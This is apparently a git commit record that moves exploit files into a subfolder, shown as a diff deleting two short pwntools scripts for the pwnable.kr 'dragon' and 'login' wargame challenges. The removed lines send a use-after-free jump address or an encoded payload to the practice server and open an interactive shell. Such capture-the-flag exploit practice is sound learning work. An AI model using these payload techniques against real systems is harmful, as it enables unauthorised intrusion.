70c8fd3b3dafe4bc11bfc97281b072e8734a5ca1
plummm <etenalcxz@gmail.com>
2020-08-06 12:11:52 -0700

    move CVE-2017-7184 and pwnable.kr into subfolder

--- pwnable.kr/dragon-exp.py
+++
@@ -1,8 +0,0 @@
-from pwn import *
-
-s = remote('pwnable.kr', 9004)
-number = '1\n1\n1\n1\n3\n3\n2\n3\n3\n2\n3\n3\n2\n3\n3\n2\n'
-uaf_jmp = '\xbf\x8d\x04\x08\n'
-payload = number+uaf_jmp
-s.send(payload)
-s.interactive()
--- pwnable.kr/login-exp.py
+++
@@ -1,5 +0,0 @@
-from pwn import *
-
-p=remote("pwnable.kr",9003)
-p.sendline("QUFBQXiSBAhA6xEI")
-p.interactive()
